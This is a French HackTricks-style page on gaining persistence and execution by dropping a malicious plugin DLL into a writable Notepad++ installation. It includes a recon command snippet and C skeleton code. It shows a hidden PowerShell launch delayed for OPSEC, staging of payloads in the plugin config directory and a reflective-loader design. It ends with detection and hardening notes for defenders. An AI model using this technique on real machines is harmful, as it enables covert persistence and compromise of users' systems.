# Persistance et exécution par chargement automatique de plugins Notepad++

{{#include ../../banners/hacktricks-training.md}}

Au lancement, Notepad++ **charge automatiquement chaque DLL de plugin trouvée dans ses sous-dossiers `plugins`**. Déposer un plugin malveillant dans une **installation Notepad++ accessible en écriture** permet d’exécuter du code dans `notepad++.exe` à chaque démarrage de l’éditeur. Cela peut servir à assurer la **persistance**, à effectuer une **exécution initiale** discrète ou à utiliser un **loader en processus** si l’éditeur est lancé avec des privilèges élevés.<sup>[[1]](#references)</sup>

Depuis **Notepad++ 7.6+**, la structure attendue pour une installation manuelle est **un sous-dossier par plugin** (`plugins\<PluginName>\<PluginName>.dll`). En **mode portable** (présence de `doLocalConf.xml` à côté de `notepad++.exe`), l’arborescence complète de l’application reste dans ce répertoire. Les ensembles d’outils copiés ou destinés aux administrateurs deviennent ainsi souvent une surface d’exécution facilement accessible en écriture à l’utilisateur.<sup>[[2]](#references)</sup>

## Emplacements de plugins accessibles en écriture

- Installation standard : `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (l’écriture nécessite généralement des privilèges d’administrateur).<sup>[[1]](#references)</sup>
- Options accessibles en écriture pour les opérateurs à faibles privilèges :<sup>[[1]](#references)</sup>
  - Utiliser la **version portable de Notepad++** dans un dossier accessible en écriture à l’utilisateur.
  - Copier `C:\Program Files\Notepad++` vers un chemin contrôlé par l’utilisateur (par exemple, `%LOCALAPPDATA%\npp\`) et lancer `notepad++.exe` depuis cet emplacement.
  - Rechercher des **ensembles d’outils d’administration**, des copies extraites de fichiers zip ou des kits d’assistance qui contiennent déjà `doLocalConf.xml` et se trouvent hors de `Program Files`.
- Chaque plugin dispose de son propre sous-dossier dans `plugins` et est chargé automatiquement au démarrage ; les entrées de menu apparaissent sous **Plugins**.<sup>[[2]](#references)</sup>

Vérification rapide :

```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```

## Points de chargement du plugin (primitives d’exécution)
Notepad++ attend des **fonctions exportées** spécifiques. Elles sont toutes appelées pendant l’initialisation, ce qui offre plusieurs surfaces d’exécution :<sup>[[1]](#references)</sup>
- **`DllMain`** — s’exécute immédiatement au chargement de la DLL (premier point d’exécution).
- **`setInfo(NppData)`** — appelée une fois au chargement pour fournir les handles de Notepad++ ; emplacement habituel pour enregistrer des éléments de menu.
- **`getName()`** — renvoie le nom du plugin affiché dans le menu.
- **`getFuncsArray(int *nbF)`** — renvoie les commandes du menu ; même si le tableau est vide, cette fonction est appelée au démarrage.
- **`beNotified(SCNotification*)`** — reçoit les événements de Notepad++ / Scintilla (utile pour différer les payloads jusqu’à une action de l’utilisateur ou un événement de l’éditeur).
- **`messageProc(UINT, WPARAM, LPARAM)`** — gestionnaire de messages, utile pour les échanges de données plus importants.
- **`isUnicode()`** — indicateur de compatibilité vérifié au chargement.

La plupart des fonctions exportées peuvent être implémentées comme de simples **stubs** ; l’exécution peut avoir lieu dans `DllMain` ou dans n’importe quel callback appelé lors du chargement automatique.

## Squelette minimal de plugin malveillant
Compilez une DLL avec les exports attendus et placez-la dans `plugins\\MyNewPlugin\\MyNewPlugin.dll`, dans un dossier Notepad++ accessible en écriture :<sup>[[1]](#references)</sup>

```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```

1. Compilez la DLL (Visual Studio/MinGW).
2. Créez le sous-dossier du plugin dans `plugins` et déposez-y la DLL.
3. Redémarrez Notepad++; la DLL est chargée automatiquement, ce qui exécute `DllMain` et les callbacks suivants.

## Modèle de déclenchement discret via `beNotified`
Pour l’OPSEC, de nombreux payloads ne devraient **pas** se déclencher depuis `DllMain`. Une approche plus discrète consiste à charger le plugin sans incident, puis à l’exécuter uniquement après un événement réaliste de l’éditeur, comme **la fin du démarrage**, **l’activation d’un buffer** ou **la première saisie d’un caractère**.

```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
  if (fired) return;
  if (n->nmhdr.code == NPPN_READY ||
      n->nmhdr.code == NPPN_BUFFERACTIVATED ||
      n->nmhdr.code == SCN_CHARADDED) {
    fired = true;
    WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
  }
}
```

Cela correspond mieux aux recherches offensives publiques qu’un beacon `DllMain` bruyant : la DLL est toujours chargée automatiquement au démarrage, mais l’action malveillante est retardée jusqu’à ce que Notepad++ semble réellement utilisé.

## Utiliser le répertoire de configuration des plugins comme stockage secondaire
Notepad++ expose `NPPM_GETPLUGINSCONFIGDIR`, qui renvoie le **répertoire de configuration des plugins de l’utilisateur actuel**.<sup>[[3]](#references)</sup> Un plugin malveillant peut ainsi garder la DLL sur disque minimale tout en stockant une configuration chiffrée, des payloads préparés ou des fichiers de tasking dans un chemin qui se fond dans l’état normal des plugins.

```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```

Sur le plan opérationnel, cette approche est utile lorsque vous voulez :
- une petite DLL bootstrap chargée automatiquement ;
- du tasking par utilisateur sans modifier à nouveau le binaire principal du plugin ;
- séparer le **déclencheur du chargement automatique** du second stage, plus lourd.

## Reflective loader plugin pattern
Un plugin weaponized peut transformer Notepad++ en **reflective DLL loader** :<sup>[[1]](#references)</sup>
- Présenter une interface/menu minimal (par exemple, « LoadDLL »).
- Accepter un **chemin de fichier** ou une **URL** pour récupérer une payload DLL.
- Mapper la DLL de manière reflective dans le processus actuel et appeler un point d’entrée exporté (par exemple, une fonction de chargement dans la DLL récupérée).
- Avantage : réutiliser un processus GUI d’apparence légitime plutôt que de lancer un nouveau loader ; la payload hérite du niveau d’intégrité de `notepad++.exe` (y compris dans des contextes élevés).
- Compromis : déposer sur disque une **DLL de plugin non signée** est bruyant ; une variante pratique consiste à utiliser le plugin chargé automatiquement uniquement comme stub et à conserver le véritable implant, chiffré et mis en scène, ailleurs.

## Notes sur la détection et le durcissement
- Bloquer ou surveiller les **écritures dans les répertoires de plugins de Notepad++** (y compris les copies portables dans les profils utilisateur) ; activer l’accès contrôlé aux dossiers ou la liste d’autorisation des applications.
- Déclencher une alerte pour les **nouvelles DLL non signées** dans `plugins`, les modifications des arborescences Notepad++ portables et les **processus enfants/activités réseau** inhabituels de `notepad++.exe`.
- Établir une base de référence des plugins légitimes et examiner toute nouvelle DLL qui exporte l’interface normale des plugins Notepad++ mais lance également des shells, PowerShell ou des balises réseau.
- Imposer l’installation des plugins uniquement via **Plugins Admin** et restreindre l’exécution des copies portables depuis des chemins non fiables.

## References

- [1] [TrustedSec - Plugins Notepad++ : Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Manuel utilisateur Notepad++ - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Manuel utilisateur Notepad++ - Communication entre plugins](https://npp-user-manual.org/docs/plugin-communication/)
{{#include ../../banners/hacktricks-training.md}}
